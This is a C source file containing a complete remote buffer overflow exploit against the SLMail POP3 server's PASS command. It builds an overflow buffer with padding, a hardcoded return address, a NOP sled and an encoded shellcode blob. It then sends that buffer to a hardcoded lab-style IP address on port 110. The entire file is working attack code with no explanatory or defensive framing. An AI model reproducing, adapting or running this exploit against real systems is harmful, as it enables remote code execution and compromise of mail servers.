#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x8f\x35\x4a\x5f"
#define port 110

unsigned char shellcode[] =
"\xd9\xcf\xd9\x74\x24\xf4\xbb\xf1\x95\xc8\x36\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x83\xc2\x04\x03\xab\x86\x2a\xc3\xb7\x41\x28"
"\x2c\x47\x92\x4d\xa4\xa2\xa3\x4d\xd2\xa7\x94\x7d\x90\xe5\x18"
"\xf5\xf4\x1d\xaa\x7b\xd1\x12\x1b\x31\x07\x1d\x9c\x6a\x7b\x3c"
"\x1e\x71\xa8\x9e\x1f\xba\xbd\xdf\x58\xa7\x4c\x8d\x31\xa3\xe3"
"\x21\x35\xf9\x3f\xca\x05\xef\x47\x2f\xdd\x0e\x69\xfe\x55\x49"
"\xa9\x01\xb9\xe1\xe0\x19\xde\xcc\xbb\x92\x14\xba\x3d\x72\x65"
"\x43\x91\xbb\x49\xb6\xeb\xfc\x6e\x29\x9e\xf4\x8c\xd4\x99\xc3"
"\xef\x02\x2f\xd7\x48\xc0\x97\x33\x68\x05\x41\xb0\x66\xe2\x05"
"\x9e\x6a\xf5\xca\x95\x97\x7e\xed\x79\x1e\xc4\xca\x5d\x7a\x9e"
"\x73\xc4\x26\x71\x8b\x16\x89\x2e\x29\x5d\x24\x3a\x40\x3c\x21"
"\x8f\x69\xbe\xb1\x87\xfa\xcd\x83\x08\x51\x59\xa8\xc1\x7f\x9e"
"\xcf\xfb\x38\x30\x2e\x04\x39\x19\xf5\x50\x69\x31\xdc\xd8\xe2"
"\xc1\xe1\x0c\xa4\x91\x4d\xff\x05\x41\x2e\xaf\xed\x8b\xa1\x90"
"\x0e\xb4\x6b\xb9\xa5\x4f\xfc\xcc\x32\x4f\x8b\xb8\x46\x4f\x72"
"\x82\xce\xa9\x1e\xe4\x86\x62\xb7\x9d\x82\xf8\x26\x61\x19\x85"
"\x69\xe9\xae\x7a\x27\x1a\xda\x68\xd0\xea\x91\xd2\x77\xf4\x0f"
"\x7a\x1b\x67\xd4\x7a\x52\x94\x43\x2d\x33\x6a\x9a\xbb\xa9\xd5"
"\x34\xd9\x33\x83\x7f\x59\xe8\x70\x81\x60\x7d\xcc\xa5\x72\xbb"
"\xcd\xe1\x26\x13\x98\xbf\x90\xd5\x72\x0e\x4a\x8c\x29\xd8\x1a"
"\x49\x02\xdb\x5c\x56\x4f\xad\x80\xe7\x26\xe8\xbf\xc8\xae\xfc"
"\xb8\x34\x4f\x02\x13\xfd\x7f\x49\x39\x54\xe8\x14\xa8\xe4\x75"
"\xa7\x07\x2a\x80\x24\xad\xd3\x77\x34\xc4\xd6\x3c\xf2\x35\xab"
"\x2d\x97\x39\x18\x4d\xb2";

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(3500);
    memset(buffer, 0x00, 3500);
    char *off = malloc(2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(16);
    memset(nop, 0x90, 16);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.25.75");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
